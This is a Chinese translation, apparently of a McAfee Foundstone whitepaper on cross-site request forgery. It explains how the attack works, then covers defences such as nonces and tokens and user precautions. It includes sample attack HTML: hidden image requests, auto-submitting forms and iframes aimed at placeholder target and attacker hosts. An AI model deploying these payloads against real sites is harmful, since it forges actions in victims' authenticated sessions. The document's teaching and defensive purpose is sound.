## CSRF:攻击和防御
### 作者：Jeremiah Blatz 
### 目录
- CSRF的定义
- 攻击向量
  -  内联“图像”链接
  -  自动提交表单
  -  网络钓鱼
- CSRF攻击的能力
  - 模拟有效请求
  - 激活XSS，SOL注入
  - 调用web服务
- 保护你的网站
  - 解决方案不起作用
  - 有效的CSRF的解决方案
- 保护自己
  - 注销
  - 更改默认密码
  - 使用不同的浏览器
  - 使用虚拟机
  - 通过代理执行
- 总结

#### CSRF定义
- CSRF表示跨站点请求伪造，也被称为会话骑乘或者XSRF。 CSRF利用Web固有的无状态来模拟来自另一个网站（攻击站点）的一个网站（目标站点）上的用户操作。通常，CSRF将会使用受害者的身份验证会话执行攻击者选择的操作，如果受害者已经登录到目标站点，攻击者可以强制受害者的浏览器在目标站点上执行操作
- 要了解更多的细节，让我们看看当用户访问一个网站时会发生什么：

![image](https://github.com/CUCCS/2018-NS-Group-Public-pwhl/blob/CSRF/CSRF/CSRF1.png)
- 下面是CSRF攻击的情况
![image](https://github.com/CUCCS/2018-NS-Group-Public-pwhl/blob/CSRF/CSRF/CSRF2.png)

- 从web服务器的角度来说，第二个POST请求没有什么异常，它的形式也良好，还包含一个有效的会话cookie，web服务器就会很天真的接受这个请求
- 下面是CSRF的一些重要特性：
  - 受害者不需要登录，这取决于攻击者的目标。虽然CSRF最常用的目标是利用受害者的身份验证来执行一些经过身份验证的操作，但是CSRF可以用于各种攻击。例如，攻击者可能用CSRF进行欺诈、未经身份验证的操作。比如在线投票中的投票，或者攻击者可用CSRF进行拒绝服务攻击，方法是在一个流行的留言板上发布一条消息，然后向另一个站点发出请求。最后，CSRF可用于滥用浏览器和web服务器之间的不安全信任关系，例如使用IP地址限制、HTTP基本身份验证或者SSL客户证书的网站。
  - 攻击者可以对目标站点上的一系列请求发出任何请求。换句话说，这个请求的操作需要多少步骤并不重要。攻击者只能编写多个请求的脚本。
  - CSRF能够极好地处理其他攻击。虽然在目标站点上执行一些有效的操作对攻击者来说非常有用，但CSRF攻击也可以和其他攻击一起使用，以创建一个“死于千刀万剐”的情景。一些例子包括使用CSRF来利用身份验证后的跨站点脚本或者SQL注入攻击，或者利用仅能通过HTTP POST使用的反射的跨站点脚本。
  - 攻击者通常无法从目标站点读取数据。尽管CSRF是攻击者的一个强大的工具，但是它受到严重的限制。由于同源策略，一个站点的脚本无法从另一个站点的脚本读取数据。因此，一个步骤的结果必须输入到下一个步骤的多步骤操作不会受到CSRF的影响。当然也会存在例外，例如：如果前面提到的输出是可预测的，攻击者可能会猜测或者强制执行它们。另外，如果目标站点上存在单个跨站点脚本漏洞，则所有的赌注就没有了，攻击者可以利用跨站点脚本来对目标进行读写攻击。在其他边缘情况下，攻击者可能能够从目标站点读取到一些数据。
  
#### 攻击向量
- 在这些例子中，我们的受害者站点是 ```target.example.com```。上面有一页表格，html将其数据发送给```action.html```，用户将加载```http://target.example.com/form.html```，然后在表单中填写数据，单击submit按钮，用户的的浏览器将向 ```http://target. example.com/action.html```发送请求，它将使用数据进行一些操作。
- 攻击者的目标是使受害者的浏览器提交攻击者选择的数据到```action.html```。攻击者有哪些方法可以做到这一点？
##### 内联“图像”链接
- 创建CSRF的攻击有几种方法。最简单的方法是在另外一个页面嵌入对外部资源（例如图像）的引用。这种攻击很容易发起，因为几乎所有的公告牌网站都允许用户在帖子中嵌入图像，要记住的是浏览器无法知道所请求的“图像”实际上是执行某些操作的web页面。
- 例如，留言板上的以下帖子将导致浏览器向目标web服务器发送请求。
```
I agree with the above poster
<img src=”http://target.example.com/action.html?field1=foo&field2=bar” width=”1” height=”1”>
```
##### 自动提交表单
- 如果操作需要HTTP POST，攻击就会稍微有点复杂。攻击者可以通过HTML或者JavaScript创建表单，这些要求攻击者对CSRF站点有一定程度的控制，因为他们需要在站点中嵌入自己的HTML。他们可以通过网站所有者或者在网站中找到某种跨站点脚本的编制漏洞，从而获得这种控制。不幸的是，对我们来说，很容易找到具有跨站点脚本编制漏洞的网站，具有跨站点脚本漏洞的站点的百分比估计很高，高达70%到80%。
- 这有一个在攻击者的站点上使用HTML表单的例子，例如 ```http://attacker.example.com/CSRF.html```: 
 ```
<html>  
<body onload=”document.frames[0].submit()”> 
<form action=”http://target.example.com/action.html” method=”POST”> 
<input name=”field1” value=”foo”>  
<input name=”field2” value=”bar”> 
</form>  
</body> 
</html>
```
  
  - 攻击者将在CSRF站点注入以下内容：
  ```
   <iframe width=”0” height=”0” style=”visibility: hidden;”  src=”http://attacker.example.com/CSRF.html”>
   ```
- 还可以使用跨站点脚本来使用CSRF站点上的非恶意页面来充当恶意页面。换句话说，具有跨站点脚本漏洞的互联网上的任何站点都可以用于发起CSRF攻击，这使得攻击者不需要托管自己的攻击页面。

##### 网络钓鱼
- 从技术角度来看，利用CSRF最简单的方法是完全控制CSRF站点，然后说服受害者访问该站点，网络钓鱼对大规模攻击和针对性攻击都非常有用。
- 对于针对消费银行等的大规模攻击，网络钓鱼者可以通过在目标站点的实际操作来补充他们的信息收集。即使受害者拒绝透露他们的信息，他们也可能已经受到了威胁。
- 对于有针对性的攻击，网络钓鱼更加有效。内部网络和管理系统是很好的CSRF的目标，攻击者可以为这些目标定制钓鱼邮件。例如，如果攻击内部网络，网络钓鱼者可以发送一封声称来自企业培训合作伙伴或者保险公司的电子邮件。如果攻击博客，钓鱼者可以给维护者发送电子邮件，告诉他们一个很酷的站点。如果攻击一个服务台系统，钓鱼者可以通过电子邮件向求助者提供关于网站问题的信息。受害者不需要在CSRF网站上执行任何操作，仅访问该网站就可以了。此外，在大多数这些例子中，受害者很有可能在收到钓鱼邮件时登录。

#### CSRF攻击的能力
- 就像前面所说的，CSRF攻击允许攻击者使用受害者的web浏览器将HTTP请求发送到第三方站点，这是一个非常广泛的网络。以下是一些具体的例子，要记住的是目标站点可以是通过受害者浏览器访问的任何站点。这包括内部网络站点和其他甚至无法从互联网访问的站点。

##### 模拟有效请求
- 当人们谈论到CSRF攻击时，他们通常的意思是指攻击者使用CSRF诈骗在目标网站上执行正常操作，这些操作可能是：
  - 更改用户电子邮件的地址，然后执行“忘记密码”操作以访问用户的帐户。
  - 为用户的blog2或其他系统添加帐户
  - 从用户的银行系统转账
  - 作为“泵和转储”计划的一部分，转入股票的买入指令
  - 检查文件是否存在。这可以用于在内部中查找和指纹化web服务器

##### 激活XSS,SQL注入
- 除了正常操作之外，CSRF还可以用于利用目标网站上的漏洞。在对修复进行优先级排序时，站点拥有者通常会在管理系统和内部网系统对跨站点脚本编制进行优先级排序，XSS攻击只能通过HTTP post加以利用，并且在站点的某些部分只对受信任的用户进行SQL注入。在CSRF中，所有这些都很容易受到未经身份验证的攻击者的攻击。

##### 调用web服务
- 在某些情况，CSRF攻击可以调用web服务。例如通过使用HTML表单的“enctype"属性，攻击者可以将半有效的XML传递给web服务端点。例如：
 ```
<form action=”http://target.example.com/webservice”        method=”POST” enctype=”text/plain”>
<input name=”<msg><attr><name>a</name><value>b</value></attr></msg>” value=””> 
<input type=”submit”> 
</form>
```
- 对此有一个提醒：攻击者不能设置请求头，因此对SOAP web服务（需要“SOAPAction")的请求将无法工作。
 
#### 保护你的网站
##### 解决方案不起作用
- 在开始介绍如何保护网站免受欺诈请求之间，我们首先讨论一些没有提供足够保护的解决方案。下面讨论的方法可能会使攻击者的工作稍微有些困难，但是不会阻止他们进行CSRF攻击。
###### 确认屏幕
- 据报道，一些人认为对用户行为的确认提供了对CSRF的保护。然而简单的屏幕确认不能提供任何措施来防止这种攻击。如果表单存储在隐藏字段中，攻击者只需发送确认屏幕生成的请求。如果表单存储在服务器会话中，并且确认屏幕导致服务器实际执行请求操作，那么攻击者只需发送两个请求，并且它们之间有延迟。例如，修改上面的HTTP POST示例，我们可以用以下HTML：
```
http://attacker.example.com/CSRFstep1.html: <html>  
<body onload=”document.frames[0].submit()”>   <form action=”http://target.example.com/action.html” method=”POST”>  
<input name=”field1” value=”foo”> 
<input name=”field2” value=”bar”> 
</form> 
</body> 
</html>

http://attacker.example.com/CSRFstep2.html: <html>
<body onload=”setTimeout(‘document.forms[0].submit()’, 4000)”> 
<form action=”http://target.example.com/confirm.html” method=”POST”> 
<input name=”confirm” value=”true”>  
</form> 
</body> 
</html>
```

CSRF站点
```
<iframe width=”0” height=”0” src=”http://attacker.example.com/CSRFstep1.html”> 
<iframe width=”0” height=”0” src=”http://attacker.example.com/CSRFstep2.html”> 
```
不管怎样，应用程序还是脆弱的。

###### 使用POST
- 针对微不足道的CSRF攻击的一种防御方法也是微不足道的。每个导致页面状态改变的web脚本，由于web基础的性质，无论是数据库插入、编写文件或移动机器人摄像机，都应该使用HTTP POST。对使用GET参数的页面可以加入标签、缓存和导航。因此，不希望将GET请求发送到修改数据的脚本。所以具有这种效果的表单应该使用POST方法，它们的后端实现应该查找POST参数。作为一个愉快的副作用，这可以防止CSRF攻击中的“请求嵌入式映像”。
- 然而，互联网上有很多网站存在跨站点脚本编制漏洞，因此攻击者很容易找到站点对其发起基于post的攻击。这并不是说web应用程序不应该在任何适用的地方使用HTTP POST，只是使用POST不能保证安全性，在最好的情况下，它可以被认为是在更大的深度防御战略中的初步缓和。
###### 检查“referrer"头
- 当遇到CSRF问题时，人们经常想到的一个解决方案是检查HTTP请求中的“referrer"头。由于恶意用户很容易的修改其web浏览器发送的引用头值，所以引用检查在安全领域受到广泛的非议。然而，在CSRF中，我们不关心恶意客户端，客户是这次攻击的受害者，所以引用头值应该是可信的。
- 不幸的是，我们不能依赖于每个请求都会附带引用头的事实，因为有些web浏览器从来不发送消息头，有一些浏览器只在某些时候发送消息头。另外，代理服务器可能会剔除消息头。在大多数情况下，要求用户有正确的软件和网络基础设施组合的意识，以便他们在发送引用信息头时会产生不可接受的成本。

##### 有效的CSRF解决方案
- 上面我们已经介绍了一些对CSRF漏洞的常见非工作解决方案。现在我们将讨论一些可行的解决方案，所有的这些方案都足够有效，可以将CSRF威胁较少到微不足道的程度，但是都会有一定的成本。一些比另外一些更容易实现，一些给用户带来沉重的负担，一些比另一些更安全，哪一个适合你取决于你的应用程序、开发周期和用户基础的环境。
###### 什么是“nonce”
- 很多解决方案都涉及到nonce，“Nonce”是“只使用一次的密码”的缩写形式，是事务中使用的一次性令牌。用于CSRF保护的nonce的要求明显低于用于密码学的要求，攻击者可以对受害者发出请求的数量加以限制，因此nonce只需难以预测即可。虽然没有理由不使用高质量的随机数，例如128位的随机的加密数据或者是GUID，但是简单的使用两个或者多个非加密随机数和一个静态密钥的散列是可以接受的。

###### 单页面的nonce
- 要实现CSRF保护最简单的方法是在每个表单中插入一个nonce，并将其插入到服务器会话中的一个特殊槽中，然后在提交表单时比较两个变量的值。下面是一个伪代码样例：
```
<% nonce = generate_nonce() session.nonce = nonce %> 
<form>  
<input name=”field1”><br>  <input name=”field2”><br>  <input type=”submit”>
<input name=”nonce” type=”hidden” value=”<%= nonce %>”> 
</form> 
```
当提交表单时，执行下面的代码：
```
if (post.nonce != session.nonce)
{
log_CSRF_attack()  error_and_exit()
} // normal form handling here
```
- 这段代码的作用是验证每个处理请求的请求之前都有一个相关表单的请求。换句话说，对于每个提交的表单，它都已经被加载了。由于DOM安全模型的原因，攻击者无法从其他站点读取数据，因此无法加载表单并读取nonce的值，尽管这种方法对CSRF提供了很好的保护，但是也不是没有任何问题。
- 这种方法的问题在于破坏预期的web行为而不是安全性。例如，假设用户正在使用他们的浏览器访问网站，然后他们在浏览器中打开第二个窗口或者选项卡，继续浏览第二个窗口或选项卡的同一个站点。

第一个浏览器窗口 | 第一个浏览器窗口  |服务器
---|---|---
加载表单：nonce a||Nonce a
 | 加载表单：nonce b|Nonce b
 | 提交表单|Nonce b：okay
提交表单 | |Nonce a:error
- 可以看到，用户通常希望两个表单提交都能通过，但是第二个表单（在第一个浏览器窗口）被服务器阻塞。
- 除了多浏览器窗口的问题之外，页面缓存也可能会导致类似的问题

###### 每次会话的Nonce
- 为了克服每个表单nonce可用性的弱点，可以使用每个会话令牌。在这种情况下，在会话开始时创建一个令牌并且在整个会话中使用。在下面这个伪代码的示例中，有一些全局应用的程序文件
```
<% function session_initiate(first_name, last_name /* etc */) {     session.fisrt_name = first_name     session.last_name = last_name     /* etc */     session.form_token = generate_form_token() } %>  
```
在页面代码中
```
<% <form> 
<input name=”field1”><br>  <input name=”field2”><br>  <input type=”submit”>
<input name=”form_token” type=”hidden” value=”<%= session.form_token %>”> </form>
```
当提交表单时执行以下代码：
```
if (post.form_token != session.form_token) {  log_CSRF_attack()  error_and_exit() } // normal form handling here
```
- 这种方法的主要优点是有多个浏览器窗口、页面缓存和其他功能不会在CSRF检测中导致误报。然而，这是一个非常脆弱的解决方案。由于表单令牌的生命周期很长，因此必须要保护它不泄露。如果攻击者能够恢复目标的表单令牌，只要目标的会话是活动，他们就能够发出有效的请求。
- 幸运的是，必须用来保护令牌的技术已经得到很好的理解，并且是长期安全web开发实践的一部分。令牌在传输的过程中必须是安全的，通信应该通过SSL进行保护，并且标记永远不应该出现在URL中，以便防止通过代理或者浏览器历史记录进行检索。当然，网站中的跨站点脚本漏洞将允许攻击者窃取表单令牌。但是，如果攻击者已经找到了跨站点脚本攻击漏洞，那么攻击者很可能对利用CSRF漏洞不感兴趣，因为有跨站点脚本就足够了。

###### 验证码/确认
- 上述解决方案具有对用户透明的显著优点。因此，它们是绝大多数情况下的首选解决方案。还有其他几种更具有入侵性的保护机制。这里讨论它们主要是因为它们可能已经准备好抵御其他攻击，因此可能会提供针对CSRF的网站保护作为额外的特性。所有这些机制都使用核心概念作为上面描述的nonce，但是它们需要用户交互。它们的核心是一些攻击者无法读取数据（因为同源策略），但是它们要求用户输入秘密数据。
- 验证码的目的是防止自动脚本在网络上提交表单，它们通常在web页面上呈现某些文本的扭曲图像，并且要求用户重新输入到文本框中。由于攻击者无法读取验证码图像，那么他们就没有希望确定正确的文本。要注意的是畸变程度对CSRF保护没有影响，即使是最糟糕的验证码也能够提供有效的防御。
- 为了执行敏感的操作，一些网站要求用户重新输入密码或者输入一个独立的“确认密码”。一个常见的例子是大多数网站的更改密码的功能。由于攻击者不知道受害者的密码，所以不可能使用CSRF。

#### 保护好你自己
- 虽然保护网站不受CSRF攻击相对简单，但是将保护更新到网站上是很费时的。考虑到几乎所有允许用户操作的站点都容易受到CSRF的攻击，用户可能希望采取措施保护自己免受CSRF攻击
##### 注销
- CSRF攻击通常要求受害者登录到目标网站。为了尽量减少此类攻击，用户可以限制登录网站的时间。特别值得注意的是那些使用HTTP基本身份验证的站点。浏览器通常会为用户提供基本身份验证凭据方便以后有使用的机会。如果用户选择这样做，那么针对这些网站的CSRF攻击将始终有效。一个常见的例子是针对宽带路由器的所谓“驱动链接”攻击。
- 为了减少CSRF攻击的风险。用户不应该保存基本的认证凭证，在完成交易后才退出网站，以及在使用“重要”或者“敏感”网站时应该避免浏览一般网页。

##### 更改默认密码
- 很多支持web的设备都附带默认的用户帐户以及众所周知的用户名和密码。攻击者正好可以利用这一点，在进行真正的CSRF攻击之前，可以先试图使用CSRF让用户登录到目标网站。这对于路由器来说尤其值得关注，因为路由器往往有可以预测的IP地址。更改这些设备上的默认密码可以防止攻击者执行CSRF登录操作。

##### 使用不同的浏览器
- 大多数CSRF目标都要求受害者在浏览器上有一个活动会话，以便攻击者能够正常的工作。用户保护自己不受CSRF攻击的一种方法是使用一种浏览器浏览敏感的、受信任的站点，另一种浏览器浏览一般站点。例如，一个企业用户可以使用Microsoft Internet Explorer浏览其企业的内部网络，使用火狐浏览器浏览互联网，非常敏感的站点（例如用于网络基础设施的管理控制台、用户管理控制台、金融门户等）可能需要第三个浏览器。

##### 使用虚拟机
- 对于不同类别的浏览行为使用不同的浏览器并不是一个特别可以伸缩的解决方案，因为目前只有5种主要的web浏览器可用。此外，站点浏览器需求可能会限制用户的选择。解决这个问题的一种方法是使用专用的浏览器虚拟机，它配置了一个最小的操作系统和一个web浏览器。虽然该解决方案本身存在可伸缩性的问题，但是它具有其他安全优势。许多用户在访问可疑网站时会在虚拟机中运行浏览器，这包括在用户偶然发现一些恶意软件的情况下的损害。

##### 使用代理执行
- IT管理员可以通过使用代理服务器和在用户的浏览器上配置代理设置来强制使用不同的浏览器访问不同类别的站点。例如，可能只有通过设置代理服务器才能访问互联网上的站点，而内部网的站点则可以直接访问。IT管理员可以将用户的谷歌浏览器设置为只使用代理服务器（因此只能访问互联网站点），将用户的Internet Explorer配置为不使用代理服务器（因此只能访问内部站点）。这种配置将消除互联网上恶意站点对内部网和组织的基于web的管理控制台发起CSRF攻击的能力。

#### 总结
- 跨站点请求伪造技术是一种非常强大的攻击技术。在某些情况下（例如攻击允许攻击者创建管理用户的用户系统），它有可能导致用户系统的完全破坏，在其他情况下影响很小。
- 网站所有者可以通过验证请求的来源或者要求请求携带秘密信息来保护网站免受CSRF攻击。用户则可以通过限制他们暴露于潜在攻击来保护自己。

- 在本文开始和完成之间的三年半时间里，CSRF的意识大大增加，许多图书馆可以帮助开发者保护他们的网站。但是互联网上的绝大多数网站仍然是脆弱的。我希望本文有助于提高对这一问题的认识和现有的对策。
#### 致谢
- 我要感谢Brandon Eisenmann多年前向我介绍了CSRF的概念，他在迈克菲Foundstone的同事们对本文进行了审查，并感谢他的父母在小时候放纵自己的强迫力去拆开他所能使用的所有机械和电气设备。
#### 关于作者
-  Jeremiah Blatz是McAfee Foundstone的安全顾问。 他是McAfee Foundstone的Ultimate Hacking：Web类的维护者，也是Web应用程序渗透测试的服务线负责人。 在业余时间，他喜欢在三宝的训练，并为他美妙的妻子烹饪过度的饭菜。
#### 关于McAfee Foundstone专业服务
- McAfee Foundstone专业服务是迈克菲的一个部门，提供专家服务和教育，帮助企业持续，可衡量地保护其最重要的资产免受最严重的威胁。 通过战略性的安全方法，McAfee Foundstone可以识别并实现技术，人员和流程的适当平衡，从而更有效地管理数字风险并更好地利用安全投资。 该公司的专业服务团队由公认的安全专家和作家组成，他们在跨国公司，公共部门和美国军方拥有广泛的安全经验。
